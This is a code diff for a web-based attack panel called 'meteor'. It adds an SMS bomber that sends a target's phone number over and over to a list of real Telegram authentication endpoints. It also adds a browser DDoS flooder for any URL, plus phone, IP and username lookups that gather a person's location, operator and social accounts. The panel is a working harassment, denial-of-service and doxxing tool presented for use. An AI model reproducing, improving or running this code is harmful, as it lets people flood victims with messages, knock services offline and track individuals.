+        setInterval(updateStats, 1000);
+
+        // ============================================================
+        //  REPORT
+        // ============================================================
+        function showReport(title, content) {
+            document.getElementById('reportTitle').textContent = title;
+            document.getElementById('reportContent').textContent = content;
+            lastReportData = content;
+            document.getElementById('reportModal').classList.add('active');
+        }
+
+        function closeReport() {
+            document.getElementById('reportModal').classList.remove('active');
+        }
+
+        function downloadReport() {
+            if (!lastReportData) return;
+            const blob = new Blob([lastReportData], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `meteor_report_${Date.now()}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function copyReport() {
+            if (!lastReportData) return;
+            navigator.clipboard.writeText(lastReportData).then(() => {
+                log('📋 report copied', 'success');
+            }).catch(() => {
+                const ta = document.createElement('textarea');
+                ta.value = lastReportData;
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                ta.remove();
+                log('📋 report copied (fallback)', 'success');
+            });
+        }
+
+        // ============================================================
+        //  SMS BOMBER
+        // ============================================================
+        const endpoints = [
+            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
+            'https://translations.telegram.org/auth/request',
+            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
+            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
+            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
+            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
+            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
+            'https://my.telegram.org/auth/send_password'
+        ];
+        function ua() { return ['Windows NT 10.0','Mac OS X','Linux x86_64'][Math.floor(Math.random()*3)]; }
+        async function sendBatch(phone) {
+            let shuffled = [...endpoints];
+            for (let i = shuffled.length - 1; i > 0; i--) { let j = Math.floor(Math.random()*(i+1)); [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]]; }
+            let ok = 0;
+            for (let ep of shuffled.slice(0,5)) {
+                try {
+                    await fetch(ep, {
+                        method: 'POST',
+                        headers: { 'User-Agent': ua(), 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `phone=${encodeURIComponent(phone)}`,
+                        mode: 'no-cors'
+                    });
+                    ok++; total++; success++;
+                } catch(e) { total++; }
+                await new Promise(r => setTimeout(r, 200));
+            }
+            return ok;
+        }
+        document.getElementById('smsBtn').onclick = async () => {
+            let phone = document.getElementById('smsPhone').value.trim();
+            let cycles = parseInt(document.getElementById('smsCycles').value);
+            if (!phone.startsWith('+')) { log('❌ phone must start with +', 'error', document.getElementById('smsLog')); return; }
+            let btn = document.getElementById('smsBtn');
+            btn.disabled = true; btn.innerText = '⏳ ...';
+            log(`🚀 SMS on ${phone} | ${cycles} cycles`, 'info', document.getElementById('smsLog'));
+            for (let c = 1; c <= cycles; c++) {
+                let sent = await sendBatch(phone);
+                log(`✅ cycle ${c}/${cycles}: ${sent}/5`, 'success', document.getElementById('smsLog'));
+                if (c < cycles) await new Promise(r => setTimeout(r, 2500));
+            }
+            btn.disabled = false; btn.innerText = '▶ Launch';
             beep();
-            log('✅ DDoS завершена', 'success', document.getElementById('ddosLog'));
-        }, duration*1000);
-    };
-
-    // --- настройки
-    function setTheme(color) {
-        let val = color==='purple'?'#b77cff':color==='cyan'?'#00ffcc':color==='pink'?'#ff44aa':'#ff4444';
-        document.documentElement.style.setProperty('--glow', val);
-        localStorage.setItem('theme', color);
-        document.querySelectorAll('.theme-btn').forEach(btn=>{ if(btn.getAttribute('data-theme')===color) btn.classList.add('active'); else btn.classList.remove('active'); });
-    }
-    document.querySelectorAll('.theme-btn').forEach(btn=>{ btn.onclick = ()=>setTheme(btn.getAttribute('data-theme')); });
-    let savedTheme = localStorage.getItem('theme'); if(savedTheme) setTheme(savedTheme);
-    let fontSelect = document.getElementById('fontSelect');
-    fontSelect.onchange = ()=>{ document.body.style.fontFamily = fontSelect.value+', monospace'; localStorage.setItem('font', fontSelect.value); };
-    if(localStorage.getItem('font')) { fontSelect.value = localStorage.getItem('font'); document.body.style.fontFamily = fontSelect.value+', monospace'; }
-    let glowRange = document.getElementById('glowRange');
-    glowRange.oninput = ()=>{ document.documentElement.style.setProperty('--glow-intensity', glowRange.value+'px'); localStorage.setItem('glow', glowRange.value); };
-    if(localStorage.getItem('glow')) { glowRange.value = localStorage.getItem('glow'); document.documentElement.style.setProperty('--glow-intensity', glowRange.value+'px'); }
-    let soundSelect = document.getElementById('soundSelect');
-    soundSelect.onchange = ()=>{ sound = soundSelect.value === 'on'; localStorage.setItem('sound', sound); };
-    if(localStorage.getItem('sound') !== null) { sound = localStorage.getItem('sound') === 'true'; soundSelect.value = sound ? 'on' : 'off'; }
-    let particleRange = document.getElementById('particleRange');
-    particleRange.oninput = ()=>{ localStorage.setItem('particles', particleRange.value); location.reload(); };
-    document.getElementById('resetBtn').onclick = ()=>{ localStorage.clear(); location.reload(); };
-
-    // --- логи
-    document.getElementById('clearLogs').onclick = ()=>{ document.getElementById('globalLog').innerHTML = ''; log('логи очищены', 'info'); };
-    document.getElementById('copyLogs').onclick = ()=>{ let text = ''; document.querySelectorAll('#globalLog .log-line').forEach(l=>text+=l.innerText+'\n'); navigator.clipboard.writeText(text); log('📋 скопировано', 'success'); };
-
-    // --- команды
-    let cmd = document.getElementById('cmd');
-    cmd.onkeypress = (e)=>{
-        if(e.key==='Enter') {
-            let c = cmd.value.trim().toLowerCase();
-            log(`> ${c}`, 'info');
-            if(c==='help') log('help | clear | status | theme purple/cyan/pink/red', 'info');
-            else if(c==='clear') document.getElementById('globalLog').innerHTML = '';
-            else if(c==='status') log(`запросов: ${total}, успех: ${success}, uptime: ${document.getElementById('uptime').innerText}`, 'info');
-            else if(c.startsWith('theme')) setTheme(c.split(' ')[1]);
-            else log('❌ неизвестно', 'error');
-            cmd.value = '';
-        }
-    };
-
-    // --- навигация
-    let panels = { dashboard:document.getElementById('dashboard'), sms:document.getElementById('sms'), ddos:document.getElementById('ddos'), settings:document.getElementById('settings'), logs:document.getElementById('logs') };
-    document.querySelectorAll('.icon').forEach(icon=>{
-        icon.onclick = ()=>{
-            let page = icon.getAttribute('data-page');
-            Object.values(panels).forEach(p=>p.classList.remove('active'));
-            panels[page].classList.add('active');
-            document.querySelectorAll('.icon').forEach(i=>i.classList.remove('active'));
-            icon.classList.add('active');
+            log('🏁 done', 'success', document.getElementById('smsLog'));
         };
-    });
 
-    // --- часы, графика, частицы
-    function tick() { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }
-    setInterval(tick, 1000); tick();
-    let canvas = document.getElementById('chart');
-    ctx = canvas.getContext('2d');
-    canvas.width = 400; canvas.height = 100;
-    let partCount = localStorage.getItem('particles') || 50;
-    let container = document.getElementById('particles');
-    for(let i=0;i<partCount;i++) {
-        let p = document.createElement('div');
-        p.className = 'particle';
-        p.style.width = (Math.random()*6+2)+'px';
-        p.style.height = p.style.width;
-        p.style.left = Math.random()*100+'%';
-        p.style.animationDuration = Math.random()*12+6+'s';
-        p.style.animationDelay = Math.random()*10+'s';
-        container.appendChild(p);
-    }
-    log('система готова', 'success');
-</script>
+        // ============================================================
+        //  DDOS
+        // ============================================================
+        async function flood(url) { if (!ddosActive) return; try { await fetch(url, { mode: 'no-cors', cache: 'no-store' }); total++; success++; } catch(e) { total++; } }
+        document.getElementById('ddosBtn').onclick = () => {
+            let url = document.getElementById('ddosUrl').value.trim();
+            let threads = parseInt(document.getElementById('ddosThreads').value);
+            let duration = parseInt(document.getElementById('ddosDuration').value);
+            if (!url) { log('❌ enter url', 'error', document.getElementById('ddosLog')); return; }
+            if (!url.startsWith('http')) url = 'https://' + url;
+            let btn = document.getElementById('ddosBtn');
+            btn.disabled = true; btn.innerText = '⏳ ...';
+            let prog = document.getElementById('ddosProgress');
+            let fill = document.getElementById('ddosFill');
+            prog.style.display = 'block';
+            fill.style.width = '0%';
+            ddosActive = true;
+            log(`🔥 DDoS on ${url} | threads ${threads} | ${duration}s`, 'info', document.getElementById('ddosLog'));
+            let startTime = Date.now();
+            let interval = setInterval(() => {
+                for (let i = 0; i < threads; i++) flood(url);
+                let p = Math.min(100, ((Date.now() - startTime) / (duration * 1000)) * 100);
+                fill.style.width = p + '%';
+            }, 40);
+            setTimeout(() => {
+                ddosActive = false;
+                clearInterval(interval);
+                prog.style.display = 'none';
+                btn.disabled = false; btn.innerText = '▶ Launch';
+                beep();
+                log('✅ DDoS finished', 'success', document.getElementById('ddosLog'));
+            }, duration * 1000);
+        };
+
+        // ============================================================
+        //  SEARCH — РАСШИРЕННЫЙ (гео + соцсети)
+        // ============================================================
+
+        // ----- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ -----
+        async function searchPhoneNumber(phone) {
+            try {
+                const clean = phone.replace(/[^\d+]/g, '');
+                const url = `https://htmlweb.ru/geo/api.php?json&telcod=${clean}`;
+                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+                if (!resp.ok) return { error: 'HTTP ' + resp.status };
+                return await resp.json();
+            } catch(e) { return { error: e.message }; }
+        }
+
+        async function searchIpAddress(ip) {
+            try {
+                const url = `https://htmlweb.ru/geo/api.php?json&ip=${ip}`;
+                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+                if (!resp.ok) return { error: 'HTTP ' + resp.status };
+                return await resp.json();
+            } catch(e) { return { error: e.message }; }
+        }
+
+        async function searchMnp(phone) {
+            try {
+                const clean = phone.replace(/[^\d+]/g, '');
+                const url = `https://htmlweb.ru/json/mnp/phone/${clean}`;
+                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
+                if (!resp.ok) return { error: 'HTTP ' + resp.status };
+                return await resp.json();
+            } catch(e) { return { error: e.message }; }
+        }
+
+        // ----- СОЦИАЛЬНЫЕ СЕТИ (15+ ПЛАТФОРМ) -----
+        const SOCIAL_PLATFORMS = [
+            { name: 'Telegram', url: (u) => `https://t.me/${u}` },
+            { name: 'Instagram', url: (u) => `https://www.instagram.com/${u}/` },
+            { name: 'TikTok', url: (u) => `https://www.tiktok.com/@${u}` },
+            { name: 'Twitter/X', url: (u) => `https://twitter.com/${u}` },
+            { name: 'GitHub', url: (u) => `https://github.com/${u}` },
+            { name: 'Reddit', url: (u) => `https://www.reddit.com/user/${u}` },
+            { name: 'YouTube', url: (u) => `https://www.youtube.com/@${u}` },
+            { name: 'Facebook', url: (u) => `https://www.facebook.com/${u}` },
+            { name: 'Snapchat', url: (u) => `https://www.snapchat.com/add/${u}` },
+            { name: 'Discord', url: (u) => `https://discord.com/users/${u}` },
+            { name: 'Twitch', url: (u) => `https://www.twitch.tv/${u}` },
+            { name: 'Pinterest', url: (u) => `https://www.pinterest.com/${u}/` },
+            { name: 'LinkedIn', url: (u) => `https://www.linkedin.com/in/${u}` },
+            { name: 'Tumblr', url: (u) => `https://${u}.tumblr.com` },
+            { name: 'VK', url: (u) => `https://vk.com/${u}` }
+        ];
+
+        async function searchSocials(username) {
+            const clean = username.replace('@', '').trim();
+            if (!clean) return { error: 'empty username' };
+            const results = {};
+            for (const platform of SOCIAL_PLATFORMS) {
+                try {
+                    const url = platform.url(clean);
+                    const resp = await fetch(url, { method: 'HEAD', signal: AbortSignal.timeout(5000) });
+                    results[platform.name] = {
+                        exists: resp.ok,
+                        url: url
+                    };
+                } catch {
+                    results[platform.name] = {
+                        exists: false,
+                        url: platform.url(clean)
+                    };
+                }
+            }
+            return results;
+        }
+
+        // ----- ОБРАБОТЧИКИ С ОТЧЕТАМИ -----
+        document.getElementById('searchPhoneBtn').onclick = async () => {
+            const phone = document.getElementById('searchPhone').value.trim();
+            if (!phone) { log('❌ enter phone', 'error', document.getElementById('searchPhoneLog')); return; }
+            const logEl = document.getElementById('searchPhoneLog');
+            log('🔍 searching phone...', 'info', logEl);
+            const data = await searchPhoneNumber(phone);
+            if (data.error) {
+                log('❌ ' + data.error, 'error', logEl);
+                return;
+            }
+            let report = `📱 PHONE REPORT\n`;
+            report += `Number: ${phone}\n`;
+            report += `Country: ${data.country?.fullname || '?'}\n`;
+            report += `Region: ${data.region?.name || '?'}\n`;
+            report += `City: ${data.city || '?'}\n`;
+            report += `Coordinates: ${data.latitude || '?'}, ${data.longitude || '?'}\n`;
+            report += `Operator: ${data.oper || '?'}\n`;
+            report += `Time: ${new Date().toLocaleString()}`;
+            showReport('📱 Phone Report', report);
+            log('✅ report ready', 'success', logEl);
+        };
+
+        document.getElementById('searchIpBtn').onclick = async () => {
+            const ip = document.getElementById('searchIp').value.trim();
+            if (!ip) { log('❌ enter IP', 'error', document.getElementById('searchIpLog')); return; }
+            const logEl = document.getElementById('searchIpLog');
+            log('🌐 searching IP...', 'info', logEl);
+            const data = await searchIpAddress(ip);
+            if (data.error) {
+                log('❌ ' + data.error, 'error', logEl);
+                return;
+            }
+            let report = `🌐 IP REPORT\n`;
+            report += `IP: ${ip}\n`;
+            report += `Country: ${data.country?.fullname || '?'}\n`;
+            report += `Region: ${data.region?.name || '?'}\n`;
+            report += `City: ${data.city || '?'}\n`;
+            report += `ISP: ${data.isp || '?'}\n`;
+            report += `Time: ${new Date().toLocaleString()}`;
+            showReport('🌐 IP Report', report);
+            log('✅ report ready', 'success', logEl);
+        };
+
+        document.getElementById('searchMnpBtn').onclick = async () => {
+            const phone = document.getElementById('searchMnp').value.trim();
+            if (!phone) { log('❌ enter phone', 'error', document.getElementById('searchMnpLog')); return; }
+            const logEl = document.getElementById('searchMnpLog');
+            log('🔄 searching MNP...', 'info', logEl);
+            const data = await searchMnp(phone);
+            if (data.error) {
+                log('❌ ' + data.error, 'error', logEl);
+                return;
+            }
+            let report = `🔄 MNP REPORT\n`;
+            report += `Phone: ${phone}\n`;
+            report += `Operator: ${data.oper?.brand || '?'}\n`;
+            report += `Region: ${data.region?.name || '?'}\n`;
+            report += `City: ${data.city || '?'}\n`;
+            report += `Time: ${new Date().toLocaleString()}`;
+            showReport('🔄 MNP Report', report);
+            log('✅ report ready', 'success', logEl);
+        };
+
+        document.getElementById('searchUsernameBtn').onclick = async () => {
+            const username = document.getElementById('searchUsername').value.trim();
+            if (!username) {
+                log('❌ enter username', 'error', document.getElementById('searchUsernameLog'));
+                return;
+            }
+            const logEl = document.getElementById('searchUsernameLog');
+            log('🔎 searching username on 15+ platforms...', 'info', logEl);
+            const data = await searchSocials(username);
+            if (data.error) {
+                log('❌ ' + data.error, 'error', logEl);
+                return;
+            }
+            let report = `🔎 USERNAME REPORT\n`;
+            report += `Username: @${username.replace('@', '')}\n`;
+            report += `─────────────────────────────\n`;
+            let foundCount = 0;
+            for (const [platform, info] of Object.entries(data)) {
+                const status = info.exists ? '✅ found' : '❌ not found';
+                if (info.exists) foundCount++;
+                report += `${platform}: ${status}\n`;
+                if (info.exists) report += `  ${info.url}\n`;
+            }
+            report += `─────────────────────────────\n`;
+            report += `Found on ${foundCount} / ${Object.keys(data).length} platforms\n`;
+            report += `Time: ${new Date().toLocaleString()}`;
+            showReport('🔎 Username Report', report);
+            log(`✅ found on ${foundCount} platforms`, 'success', logEl);
+        };
+
+        // ============================================================
+        //  SETTINGS
+        // ============================================================
+        let fontSelect = document.getElementById('fontSelect');
+        fontSelect.onchange = () => {
+            document.body.style.fontFamily = fontSelect.value + ', monospace';
+            localStorage.setItem('font', fontSelect.value);
+        };
+        if (localStorage.getItem('font')) {
+            fontSelect.value = localStorage.getItem('font');
+            document.body.style.fontFamily = fontSelect.value + ', monospace';
+        }
+
+        let soundSelect = document.getElementById('soundSelect');
+        soundSelect.onchange = () => {
+            sound = soundSelect.value === 'on';
+            localStorage.setItem('sound', sound);
+        };
+        if (localStorage.getItem('sound') !== null) {
+            sound = localStorage.getItem('sound') === 'true';
+            soundSelect.value = sound ? 'on' : 'off';
+        }
+
+        document.getElementById('resetBtn').onclick = () => {
+            localStorage.clear();
+            location.reload();
+        };
+
+        // ============================================================
+        //  LOGS
+        // ============================================================
+        document.getElementById('clearLogs').onclick = () => {
+            document.getElementById('globalLog').innerHTML = '';
+            log('logs cleared', 'info');
+        };
+        document.getElementById('copyLogs').onclick = () => {
+            let text = '';
+            document.querySelectorAll('#globalLog .log-line').forEach(l => text += l.innerText + '\n');
+            navigator.clipboard.writeText(text);
+            log('⎘ copied', 'success');
+        };
+
+        // ============================================================
+        //  REPORT MODAL CONTROLS
+        // ============================================================
+        document.getElementById('downloadReportBtn').onclick = downloadReport;
+        document.getElementById('copyReportBtn').onclick = copyReport;
+        document.getElementById('closeReportBtn').onclick = closeReport;
+        document.getElementById('reportModal').addEventListener('click', function(e) {
+            if (e.target === this) closeReport();
+        });
+
+        // ============================================================
+        //  NAVIGATION
+        // ============================================================
+        const pages = {
+            home: document.getElementById('page-home'),
+            spam: document.getElementById('page-spam'),
+            ddos: document.getElementById('page-ddos'),
+            search: document.getElementById('page-search'),
+            settings: document.getElementById('page-settings'),
+            logs: document.getElementById('page-logs')
+        };
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.onclick = () => {
+                const page = item.getAttribute('data-page');
+                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+                item.classList.add('active');
+                Object.values(pages).forEach(p => p.classList.remove('active'));
+                pages[page].classList.add('active');
+            };
+        });
+
+        // ============================================================
+        //  INIT
+        // ============================================================
+        log('meteor loaded', 'success');
+        log('◈ search username to check 15+ social platforms', 'info');
+        updateStats();
+    </script>
 </body>
 </html>
